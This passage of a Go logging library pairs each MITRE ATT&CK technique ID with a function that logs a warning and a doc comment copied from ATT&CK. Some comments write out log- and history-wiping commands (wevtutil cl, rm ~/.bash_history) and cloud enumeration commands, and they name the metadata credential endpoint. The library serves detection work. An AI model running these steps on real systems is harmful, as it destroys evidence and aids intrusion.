exfiltration is used, other exfiltration techniques likely apply as well to
transfer the information out of the network, such as Exfiltration Over C2
Channel and Exfiltration Over Alternative Protocol.
*/
func (g *Session) ATTACKEntAutomatedExfiltration(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1020").
        Msg("automated exfiltration")
}

/* ATTACKEntBITSJobs Phases: defense-evasion persistence

Adversaries may abuse BITS jobs to persistently execute or clean up after
malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a
low-bandwidth, asynchronous file transfer mechanism exposed through Component
Object Model (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is
commonly used by updaters, messengers, and other applications preferred to
operate in the background (using available idle bandwidth) without interrupting
other networked applications. File transfer tasks are implemented as BITS jobs,
which contain a queue of one or more file operations. The interface to create
and manage BITS jobs is accessible through PowerShell and the BITSAdmin
tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin) Adversaries may
abuse BITS to download, execute, and even clean up after running malicious code.
BITS tasks are self-contained in the BITS job database, without new files or
registry modifications, and often permitted by host firewalls.(Citation: CTU
BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May
2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable
persistence by creating long-standing jobs (the default maximum lifetime is 90
days and extendable) or invoking an arbitrary program when a job completes or
errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov
2017)(Citation: CTU BITS Malware June 2016) BITS upload functionalities can also
be used to perform Exfiltration Over Alternative Protocol.(Citation: CTU BITS
Malware June 2016)
*/
func (g *Session) ATTACKEntBITSJobs(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1197").
        Msg("bits jobs")
}

/* ATTACKEntBashHistory Phases: credential-access

Adversaries may search the bash command history on compromised systems for
insecurely stored credentials. Bash keeps track of the commands users type on
the command-line with the "history" utility. Once a user logs out, the history
is flushed to the user’s .bash_history file. For each user, this file resides at
the same location: ~/.bash_history. Typically, this file keeps track of the
user’s last 500 commands. Users often type usernames and passwords on the
command-line as parameters to programs, which then get saved to this file when
they log out. Attackers can abuse this by looking through the file for potential
credentials. (Citation: External to DA, the OS X Way)
*/
func (g *Session) ATTACKEntBashHistory(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1552.003").
        Msg("bash history")
}

/* ATTACKEntBidirectionalCommunication Phases: command-and-control

Adversaries may use an existing, legitimate external Web service as a means for
sending commands to and receiving output from a compromised system over the Web
service channel. Compromised systems may leverage popular websites and social
media to host command and control (C2) instructions. Those infected systems can
then send the output from those commands back over that Web service channel. The
return traffic may occur in a variety of ways, depending on the Web service
being utilized. For example, the return traffic may take the form of the
compromised system posting a comment on a forum, issuing a pull request to
development project, updating a document hosted on a Web service, or by sending
a Tweet.  Popular websites and social media acting as a mechanism for C2 may
give a significant amount of cover due to the likelihood that hosts within a
network are already communicating with them prior to a compromise. Using common
services, such as those offered by Google or Twitter, makes it easier for
adversaries to hide in expected noise. Web service providers commonly use
SSL/TLS encryption, giving adversaries an added level of protection.
*/
func (g *Session) ATTACKEntBidirectionalCommunication(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1102.002").
        Msg("bidirectional communication")
}

/* ATTACKEntBinaryPadding Phases: defense-evasion

Adversaries may use binary padding to add junk data and change the on-disk
representation of malware. This can be done without affecting the functionality
or behavior of a binary, but can increase the size of the binary beyond what
some security tools are capable of handling due to file size limitations.
Binary padding effectively changes the checksum of the file and can also be used
to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET
OceanLotus) The padding used is commonly generated by a function to create junk
data and then appended to the end or applied to sections of malware.(Citation:
Securelist Malware Tricks April 2017) Increasing the file size may decrease the
effectiveness of certain tools and detection capabilities that are not designed
or configured to scan large files. This may also reduce the likelihood of being
collected for analysis. Public file scanning services, such as VirusTotal,
limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal
FAQ)
*/
func (g *Session) ATTACKEntBinaryPadding(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1027.001").
        Msg("binary padding")
}

/* ATTACKEntBootorLogonAutostartExecution Phases: persistence privilege-escalation

Adversaries may configure system settings to automatically execute a program
during system boot or logon to maintain persistence or gain higher-level
privileges on compromised systems. Operating systems may have mechanisms for
automatically running a program on system boot or account logon.(Citation:
Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft
TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux
Kernel Programming)  These mechanisms may include automatically executing
programs that are placed in specially designated directories or are referenced
by repositories that store configuration information, such as the Windows
Registry. An adversary may achieve the same goal by modifying or extending
features of the kernel. Since some boot or logon autostart programs run with
higher privileges, an adversary may leverage these to elevate privileges.
*/
func (g *Session) ATTACKEntBootorLogonAutostartExecution(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1547").
        Msg("boot or logon autostart execution")
}

/* ATTACKEntBootorLogonInitializationScripts Phases: persistence privilege-escalation

Adversaries may use scripts automatically executed at boot or logon
initialization to establish persistence. Initialization scripts can be used to
perform administrative functions, which may often execute other programs or send
information to an internal logging server. These scripts can vary based on
operating system and whether applied locally or remotely.   Adversaries may use
these scripts to maintain persistence on a single system. Depending on the
access configuration of the logon scripts, either local credentials or an
administrator account may be necessary.  An adversary may also be able to
escalate their privileges since some boot or logon initialization scripts run
with higher privileges.
*/
func (g *Session) ATTACKEntBootorLogonInitializationScripts(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1037").
        Msg("boot or logon initialization scripts")
}

/* ATTACKEntBootkit Phases: persistence defense-evasion

Adversaries may use bootkits to persist on systems. Bootkits reside at a layer
below the operating system and may make it difficult to perform full remediation
unless an organization suspects one was used and can act accordingly. A bootkit
is a malware variant that modifies the boot sectors of a hard drive, including
the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: Mandiant M
Trends 2016) The MBR is the section of disk that is first loaded after
completing hardware initialization by the BIOS. It is the location of the boot
loader. An adversary who has raw access to the boot drive may overwrite this
area, diverting execution during startup from the normal boot loader to
adversary code. (Citation: Lau 2011) The MBR passes control of the boot process
to the VBR. Similar to the case of MBR, an adversary who has raw access to the
boot drive may overwrite the VBR to divert execution during startup to adversary
code.
*/
func (g *Session) ATTACKEntBootkit(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1542.003").
        Msg("bootkit")
}

/* ATTACKEntBotnet Phases: resource-development

Adversaries may buy, lease, or rent a network of compromised systems that can be
used during targeting. A botnet is a network of compromised systems that can be
instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries
may purchase a subscription to use an existing botnet from a booter/stresser
service. With a botnet at their disposal, adversaries may perform follow-on
activity such as large-scale Phishing or Distributed Denial of Service
(DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-
Bazaar)(Citation: Krebs-Booter)
*/
func (g *Session) ATTACKEntBotnet(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1583.005").
        Msg("botnet")
}

/* ATTACKEntBotnet2 Phases: resource-development

Adversaries may compromise numerous third-party systems to form a botnet that
can be used during targeting. A botnet is a network of compromised systems that
can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Instead
of purchasing/renting a botnet from a booter/stresser service(Citation: Imperva
DDoS for Hire), adversaries may build their own botnet by compromising numerous
third-party systems. Adversaries may also conduct a takeover of an existing
botnet, such as redirecting bots to adversary-controlled C2 servers.(Citation:
Dell Dridex Oct 2015) With a botnet at their disposal, adversaries may perform
follow-on activity such as large-scale Phishing or Distributed Denial of Service
(DDoS).
*/
func (g *Session) ATTACKEntBotnet2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1584.005").
        Msg("botnet")
}

/* ATTACKEntBrowserBookmarkDiscovery Phases: discovery

Adversaries may enumerate browser bookmarks to learn more about compromised
hosts. Browser bookmarks may reveal personal information about users (ex:
banking sites, interests, social media, etc.) as well as details about internal
network resources such as servers, tools/dashboards, or other related
infrastructure. Browser bookmarks may also highlight additional targets after an
adversary has access to valid credentials, especially Credentials In Files
associated with logins cached by a browser. Specific storage locations vary
based on platform and/or application, but browser bookmarks are typically stored
in local files/databases.
*/
func (g *Session) ATTACKEntBrowserBookmarkDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1217").
        Msg("browser bookmark discovery")
}

/* ATTACKEntBrowserExtensions Phases: persistence

Adversaries may abuse Internet browser extensions to establish persistent access
to victim systems. Browser extensions or plugins are small programs that can add
functionality and customize aspects of Internet browsers. They can be installed
directly or through a browser's app store and generally have access and
permissions to everything that the browser can access.(Citation: Wikipedia
Browser Extension)(Citation: Chrome Extensions Definition) Malicious extensions
can be installed into a browser through malicious app store downloads
masquerading as legitimate extensions, through social engineering, or by an
adversary that has already compromised a system. Security can be limited on
browser app stores so it may not be difficult for malicious extensions to defeat
automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on
the browser, adversaries may also manipulate an extension's update url to
install updates from an adversary controlled server or manipulate the mobile
configuration file to silently install additional extensions. Previous to macOS
11, adversaries could silently install browser extensions via the command line
using the profiles tool to install malicious .mobileconfig files. In macOS 11+,
the use of the profiles tool can no longer install configuration profiles,
however .mobileconfig files can be planted and installed with user
interaction.(Citation: xorrior chrome extensions macOS) Once the extension is
installed, it can browse to websites in the background,(Citation: Chrome
Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions) steal all
information that a user enters into a browser (including credentials)(Citation:
Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome
Extension) and be used as an installer for a RAT for persistence. There have
also been instances of botnets using a persistent backdoor through malicious
Chrome extensions.(Citation: Stantinko Botnet) There have also been similar
examples of extensions being used for command & control.(Citation: Chrome
Extension C2 Malware)
*/
func (g *Session) ATTACKEntBrowserExtensions(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1176").
        Msg("browser extensions")
}

/* ATTACKEntBruteForce Phases: credential-access

Adversaries may use brute force techniques to gain access to accounts when
passwords are unknown or when password hashes are obtained. Without knowledge of
the password for an account or set of accounts, an adversary may systematically
guess the password using a repetitive or iterative mechanism. Brute forcing
passwords can take place via interaction with a service that will check the
validity of those credentials or offline against previously acquired credential
data, such as password hashes.
*/
func (g *Session) ATTACKEntBruteForce(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1110").
        Msg("brute force")
}

/* ATTACKEntBuildImageonHost Phases: defense-evasion

Adversaries may build a container image directly on a host to bypass defenses
that monitor for the retrieval of malicious images from a public registry. A
remote build request may be sent to the Docker API that includes a Dockerfile
that pulls a vanilla base image, such as alpine, from a public or local registry
and then builds a custom image upon it.(Citation: Docker Build Image) An
adversary may take advantage of that build API to build a custom image on the
host that includes malware downloaded from their C2 server, and then they then
may utilize Deploy Container using that custom image.(Citation: Aqua Build
Images on Hosts) If the base image is pulled from a public registry, defenses
will likely not detect the image as malicious since it’s a vanilla image. If the
base image already resides in a local registry, the pull may be considered even
less suspicious since the image is already in the environment.
*/
func (g *Session) ATTACKEntBuildImageonHost(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1612").
        Msg("build image on host")
}

/* ATTACKEntBusinessRelationships Phases: reconnaissance

Adversaries may gather information about the victim's business relationships
that can be used during targeting. Information about an organization’s business
relationships may include a variety of details, including second or third-party
organizations/domains (ex: managed service providers, contractors, etc.) that
have connected (and potentially elevated) network access. This information may
also reveal supply chains and shipment paths for the victim’s hardware and
software resources. Adversaries may gather this information in various ways,
such as direct elicitation via Phishing for Information. Information about
business relationships may also be exposed to adversaries via online or other
accessible data sets (ex: Social Media or Search Victim-Owned
Websites).(Citation: ThreatPost Broadvoice Leak) Gathering this information may
reveal opportunities for other forms of reconnaissance (ex: Phishing for
Information or Search Open Websites/Domains), establishing operational resources
(ex: Establish Accounts or Compromise Accounts), and/or initial access (ex:
Supply Chain Compromise, Drive-by Compromise, or Trusted Relationship).
*/
func (g *Session) ATTACKEntBusinessRelationships(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1591.002").
        Msg("business relationships")
}

/* ATTACKEntBypassUserAccountControl Phases: privilege-escalation defense-evasion

Adversaries may bypass UAC mechanisms to elevate process privileges on system.
Windows User Account Control (UAC) allows a program to elevate its privileges
(tracked as integrity levels ranging from low to high) to perform a task under
administrator-level permissions, possibly by prompting the user for
confirmation. The impact to the user ranges from denying the operation under
high enforcement to allowing the user to perform the action if they are in the
local administrators group and click through the prompt or allowing them to
enter an administrator password to complete the action. (Citation: TechNet How
UAC Works) If the UAC protection level of a computer is set to anything but the
highest level, certain Windows programs can elevate privileges or execute some
elevated Component Object Model objects without prompting the user through the
UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM
Elevation) An example of this is use of Rundll32 to load a specifically crafted
DLL which loads an auto-elevated Component Object Model object and performs a
file operation in a protected directory which would typically require elevated
access. Malicious software may also be injected into a trusted process to gain
elevated privileges without prompting a user.(Citation: Davidson Windows) Many
methods have been discovered to bypass UAC. The Github readme page for UACME
contains an extensive list of methods(Citation: Github UACMe) that have been
discovered and implemented, but may not be a comprehensive list of bypasses.
Additional bypass methods are regularly discovered and some used in the wild,
such as:  eventvwr.exe can auto-elevate and execute a specified binary or
script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)
Another bypass is possible through some lateral movement techniques if
credentials for an account with administrator privileges are known, since UAC is
a single system security mechanism, and the privilege or integrity of a process
running on one system will be unknown on remote systems and default to high
integrity.(Citation: SANS UAC Bypass)
*/
func (g *Session) ATTACKEntBypassUserAccountControl(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1548.002").
        Msg("bypass user account control")
}

/* ATTACKEntCDNs Phases: reconnaissance

Adversaries may search content delivery network (CDN) data about victims that
can be used during targeting. CDNs allow an organization to host content from a
distributed, load balanced array of servers. CDNs may also allow organizations
to customize content delivery based on the requestor’s geographical region.
Adversaries may search CDN data to gather actionable information. Threat actors
can use online resources and lookup tools to harvest information about content
servers within a CDN. Adversaries may also seek and target CDN misconfigurations
that leak sensitive information not intended to be hosted and/or do not have the
same protection mechanisms (ex: login portals) as the content hosted on the
organization’s website.(Citation: DigitalShadows CDN) Information from these
sources may reveal opportunities for other forms of reconnaissance (ex: Active
Scanning or Search Open Websites/Domains), establishing operational resources
(ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access
(ex: Drive-by Compromise).
*/
func (g *Session) ATTACKEntCDNs(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1596.004").
        Msg("cdns")
}

/* ATTACKEntCMSTP Phases: defense-evasion

Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft
Connection Manager Profile Installer (CMSTP.exe) is a command-line program used
to install Connection Manager service profiles. (Citation: Microsoft Connection
Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a
parameter and installs a service profile leveraged for remote access
connections. Adversaries may supply CMSTP.exe with INF files infected with
malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to Regsvr32
/ ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation:
MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers.
(Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass
List) (Citation: Endurant CMSTP July 2018) This execution may also bypass
AppLocker and other application control defenses since CMSTP.exe is a
legitimate, signed Microsoft application. CMSTP.exe can also be abused to Bypass
User Account Control and execute arbitrary commands from a malicious INF through
an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation:
GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)
*/
func (g *Session) ATTACKEntCMSTP(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1218.003").
        Msg("cmstp")
}

/* ATTACKEntCOR_PROFILER Phases: persistence privilege-escalation defense-evasion

Adversaries may leverage the COR_PROFILER environment variable to hijack the
execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET
Framework feature which allows developers to specify an unmanaged (or external
of .NET) profiling DLL to be loaded into each .NET process that loads the Common
Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot,
and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling
Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013) The COR_PROFILER
environment variable can be set at various scopes (system, user, or process)
resulting in different levels of influence. System and user-wide environment
variable scopes are specified in the Registry, where a Component Object Model
(COM) object can be registered as a profiler DLL. A process scope COR_PROFILER
can also be created in-memory without modifying the Registry. Starting with .NET
Framework 4, the profiling DLL does not need to be registered as long as the
location of the DLL is specified in the COR_PROFILER_PATH environment
variable.(Citation: Microsoft COR_PROFILER Feb 2013) Adversaries may abuse
COR_PROFILER to establish persistence that executes a malicious DLL in the
context of all .NET processes every time the CLR is invoked. The COR_PROFILER
can also be used to elevate privileges (ex: Bypass User Account Control) if the
victim .NET process executes at a higher permission level, as well as to hook
and Impair Defenses provided by .NET processes.(Citation: RedCanary Mockingbird
May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond
COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee
.NET Profilers May 2017)
*/
func (g *Session) ATTACKEntCOR_PROFILER(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1574.012").
        Msg("cor_profiler")
}

/* ATTACKEntCachedDomainCredentials Phases: credential-access

Adversaries may attempt to access cached domain credentials used to allow
authentication to occur in the event a domain controller is
unavailable.(Citation: Microsoft - Cached Creds) On Windows Vista and newer, the
hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as
MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached
credentials varies and can be altered per system. This hash does not allow pass-
the-hash style attacks, and instead requires Password Cracking to recover the
plaintext password.(Citation: ired mscache) With SYSTEM access, the
tools/utilities such as Mimikatz, Reg, and secretsdump.py can be used to extract
the cached credentials. Note: Cached credentials for Windows Vista are derived
using PBKDF2.(Citation: PassLib mscache)
*/
func (g *Session) ATTACKEntCachedDomainCredentials(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1003.005").
        Msg("cached domain credentials")
}

/* ATTACKEntChangeDefaultFileAssociation Phases: privilege-escalation persistence

Adversaries may establish persistence by executing malicious content triggered
by a file type association. When a file is opened, the default program used to
open the file (also called the file association or handler) is checked. File
association selections are stored in the Windows Registry and can be edited by
users, administrators, or programs that have Registry access (Citation:
Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by
administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct
2017) Applications can modify the file association for a given file extension to
call an arbitrary program when a file with the given extension is opened. System
file associations are listed under HKEY_CLASSES_ROOT.[extension], for example
HKEY_CLASSES_ROOT.txt. The entries point to a handler for that extension located
at HKEY_CLASSES_ROOT[handler]. The various commands are then listed as subkeys
underneath the shell key at HKEY_CLASSES_ROOT[handler]\shell[action]\command.
For example:  * HKEY_CLASSES_ROOT\txtfile\shell\open\command *
HKEY_CLASSES_ROOT\txtfile\shell\print\command *
HKEY_CLASSES_ROOT\txtfile\shell\printto\command The values of the keys listed
are commands that are executed when the handler opens the file extension.
Adversaries can modify these values to continually execute arbitrary commands.
(Citation: TrendMicro TROJ-FAKEAV OCT 2012)
*/
func (g *Session) ATTACKEntChangeDefaultFileAssociation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546.001").
        Msg("change default file association")
}

/* ATTACKEntClearCommandHistory Phases: defense-evasion

In addition to clearing system logs, an adversary may clear the command history
of a compromised account to conceal the actions undertaken during an intrusion.
Various command interpreters keep track of the commands users type in their
terminal so that users can retrace what they've done. On Linux and macOS, these
command histories can be accessed in a few different ways. While logged in, this
command history is tracked in a file pointed to by the environment variable
HISTFILE. When a user logs off a system, this information is flushed to a file
in the user's home directory called ~/.bash_history. The benefit of this is that
it allows users to go back to commands they've used before in different
sessions. Adversaries may delete their commands from these logs by manually
clearing the history (history -c) or deleting the bash history file rm
~/.bash_history. On Windows hosts, PowerShell has two different command history
providers: the built-in history and the command history managed by the
PSReadLine module. The built-in history only tracks the commands used in the
current session. This command history is not available to other sessions and is
deleted when the session ends. The PSReadLine command history tracks the
commands used in all PowerShell sessions and writes them to a file
($env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt by
default). This history file is available to all sessions and contains all past
history since the file is not deleted when the session ends.(Citation: Microsoft
PowerShell Command History) Adversaries may run the PowerShell command Clear-
History to flush the entire command history from a current PowerShell session.
This, however, will not delete/flush the ConsoleHost_history.txt file.
Adversaries may also delete the ConsoleHost_history.txt file or edit its
contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell
command audit)(Citation: Sophos PowerShell Command History Forensics)
*/
func (g *Session) ATTACKEntClearCommandHistory(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1070.003").
        Msg("clear command history")
}

/* ATTACKEntClearLinuxorMacSystemLogs Phases: defense-evasion

Adversaries may clear system logs to hide evidence of an intrusion. macOS and
Linux both keep track of system or user-initiated actions via system logs. The
majority of native system logging is stored under the /var/log/ directory.
Subfolders in this directory categorize logs by their related functions, such
as:(Citation: Linux Logs)  /var/log/messages:: General and system-related
messages /var/log/secure or /var/log/auth.log: Authentication logs /var/log/utmp
or /var/log/wtmp: Login records /var/log/kern.log: Kernel logs
/var/log/cron.log: Crond logs /var/log/maillog: Mail server logs
/var/log/httpd/: Web server access and error logs
*/
func (g *Session) ATTACKEntClearLinuxorMacSystemLogs(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1070.002").
        Msg("clear linux or mac system logs")
}

/* ATTACKEntClearWindowsEventLogs Phases: defense-evasion

Adversaries may clear Windows Event Logs to hide the activity of an intrusion.
Windows Event Logs are a record of a computer's alerts and notifications. There
are three system-defined sources of events: System, Application, and Security,
with five event types: Error, Warning, Information, Success Audit, and Failure
Audit. The event logs can be cleared with the following utility commands:
wevtutil cl system wevtutil cl application wevtutil cl security  These logs may
also be cleared through other mechanisms, such as the event viewer GUI or
PowerShell.
*/
func (g *Session) ATTACKEntClearWindowsEventLogs(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1070.001").
        Msg("clear windows event logs")
}

/* ATTACKEntClientConfigurations Phases: reconnaissance

Adversaries may gather information about the victim's client configurations that
can be used during targeting. Information about client configurations may
include a variety of details and settings, including operating system/version,
virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.
Adversaries may gather this information in various ways, such as direct
collection actions via Active Scanning (ex: listening ports, server banners,
user agent strings) or Phishing for Information. Adversaries may also compromise
sites then include malicious content designed to collect host information from
visitors.(Citation: ATT ScanBox) Information about the client configurations may
also be exposed to adversaries via online or other accessible data sets (ex: job
postings, network maps, assessment reports, resumes, or purchase invoices).
Gathering this information may reveal opportunities for other forms of
reconnaissance (ex: Search Open Websites/Domains or Search Open Technical
Databases), establishing operational resources (ex: Develop Capabilities or
Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or
External Remote Services).
*/
func (g *Session) ATTACKEntClientConfigurations(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1592.004").
        Msg("client configurations")
}

/* ATTACKEntClipboardData Phases: collection

Adversaries may collect data stored in the clipboard from users copying
information within or between applications.  In Windows, Applications can access
clipboard data by using the Windows API.(Citation: MSDN Clipboard) OSX provides
a native command, pbpaste, to grab clipboard contents.(Citation: Operating with
EmPyre)
*/
func (g *Session) ATTACKEntClipboardData(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1115").
        Msg("clipboard data")
}

/* ATTACKEntCloudAccount Phases: persistence

Adversaries may create a cloud account to maintain access to victim systems.
With a sufficient level of access, such accounts may be used to establish
secondary credentialed access that does not require persistent remote access
tools to be deployed on the system.(Citation: Microsoft O365 Admin
Roles)(Citation: Microsoft Support O365 Add Another Admin, October
2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity
Users)(Citation: Microsoft Azure AD Users) Adversaries may create accounts that
only have access to specific cloud services, which can reduce the chance of
detection.
*/
func (g *Session) ATTACKEntCloudAccount(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1136.003").
        Msg("cloud account")
}

/* ATTACKEntCloudAccount2 Phases: discovery

Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are
those created and configured by an organization for use by users, remote
support, services, or for administration of resources within a cloud service
provider or SaaS application. With authenticated access there are several tools
that can be used to find accounts. The Get-MsolRoleMember PowerShell cmdlet can
be used to obtain account names given a role or permissions group in Office
365.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance) The Azure
CLI (AZ CLI) also provides an interface to obtain user accounts with
authenticated access to a domain. The command az ad user list will list all
users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red
Teaming MS AD Azure, 2018)  The AWS command aws iam list-users may be used to
obtain a list of users in the current account while aws iam list-roles can
obtain IAM roles that have a specified path prefix.(Citation: AWS List
Roles)(Citation: AWS List Users) In GCP, gcloud iam service-accounts list and
gcloud projects get-iam-policy may be used to obtain a listing of service
accounts and users in a project.(Citation: Google Cloud - IAM Servie Accounts
List API)
*/
func (g *Session) ATTACKEntCloudAccount2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1087.004").
        Msg("cloud account")
}

/* ATTACKEntCloudAccounts Phases: defense-evasion persistence privilege-escalation initial-access

Adversaries may obtain and abuse credentials of a cloud account as a means of
gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.
Cloud accounts are those created and configured by an organization for use by
users, remote support, services, or for administration of resources within a
cloud service provider or SaaS application. In some cases, cloud accounts may be
federated with traditional identity management system, such as Window Active
Directory. (Citation: AWS Identity Federation)(Citation: Google Federating
GC)(Citation: Microsoft Deploying AD Federation) Compromised credentials for
cloud accounts can be used to harvest sensitive data from online storage
accounts and databases. Access to cloud accounts can also be abused to gain
Initial Access to a network by abusing a Trusted Relationship. Similar to Domain
Accounts, compromise of federated cloud accounts may allow adversaries to more
easily move laterally within an environment.
*/
func (g *Session) ATTACKEntCloudAccounts(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1078.004").
        Msg("cloud accounts")
}

/* ATTACKEntCloudGroups Phases: discovery

Adversaries may attempt to find cloud groups and permission settings. The
knowledge of cloud permission groups can help adversaries determine the
particular roles of users and groups within an environment, as well as which
users are associated with a particular group. With authenticated access there
are several tools that can be used to find permissions groups. The Get-MsolRole
PowerShell cmdlet can be used to obtain roles and permissions groups for
Exchange and Office 365 accounts.(Citation: Microsoft Msolrole)(Citation: GitHub
Raindance) Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also
provide interfaces to obtain permissions groups. The command az ad user get-
member-groups will list groups associated to a user account for Azure while the
API endpoint GET https://cloudidentity.googleapis.com/v1/groups lists group
resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation:
Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API
Documentation)
*/
func (g *Session) ATTACKEntCloudGroups(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1069.003").
        Msg("cloud groups")
}

/* ATTACKEntCloudInfrastructureDiscovery Phases: discovery

An adversary may attempt to discover resources that are available within an
infrastructure-as-a-service (IaaS) environment. This includes compute service
resources such as instances, virtual machines, and snapshots as well as
resources of other services including the storage and database services. Cloud
providers offer methods such as APIs and commands issued through CLIs to serve
information about infrastructure. For example, AWS provides a DescribeInstances
API within the Amazon EC2 API that can return information about one or more
instances within an account, as well as the ListBuckets API that returns a list
of all buckets owned by the authenticated sender of the request.(Citation:
Amazon Describe Instance)(Citation: Amazon Describe Instances API) Similarly,
GCP's Cloud SDK CLI provides the gcloud compute instances list command to list
all Google Compute Engine instances in a project(Citation: Google Compute
Instances), and Azure's CLI command az vm list lists details of virtual
machines.(Citation: Microsoft AZ CLI) An adversary may enumerate resources using
a compromised user's access keys to determine which are available to that
user.(Citation: Expel IO Evil in AWS) The discovery of these available resources
may help adversaries determine their next steps in the Cloud environment, such
as establishing Persistence.(Citation: Mandiant M-Trends 2020) Unlike in Cloud
Service Discovery, this technique focuses on the discovery of components of the
provided services rather than the services themselves.
*/
func (g *Session) ATTACKEntCloudInfrastructureDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1580").
        Msg("cloud infrastructure discovery")
}

/* ATTACKEntCloudInstanceMetadataAPI Phases: credential-access

Adversaries may attempt to access the Cloud Instance Metadata API to collect
credentials and other sensitive data. Most cloud service providers support a
Cloud Instance Metadata API which is a service provided to running virtual
instances that allows applications to access information about the running
virtual instance. Available information generally includes name, security group,
and additional metadata including sensitive data such as credentials and
UserData scripts that may contain additional secrets. The Instance Metadata API
is provided as a convenience to assist in managing applications and is
accessible by anyone who can access the instance.(Citation: AWS Instance
Metadata API) A cloud metadata API has been used in at least one high profile
compromise.(Citation: Krebs Capital One August 2019) If adversaries have a
presence on the running virtual instance, they may query the Instance Metadata
API directly to identify credentials that grant access to additional resources.
Additionally, attackers may exploit a Server-Side Request Forgery (SSRF)
vulnerability in a public facing web proxy that allows the attacker to gain
access to the sensitive information via a request to the Instance Metadata
API.(Citation: RedLock Instance Metadata API 2018) The de facto standard across
cloud service providers is to host the Instance Metadata API at
http[:]//169.254.169.254.
*/
func (g *Session) ATTACKEntCloudInstanceMetadataAPI(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1552.005").
        Msg("cloud instance metadata api")
}

/* ATTACKEntCloudServiceDashboard Phases: discovery

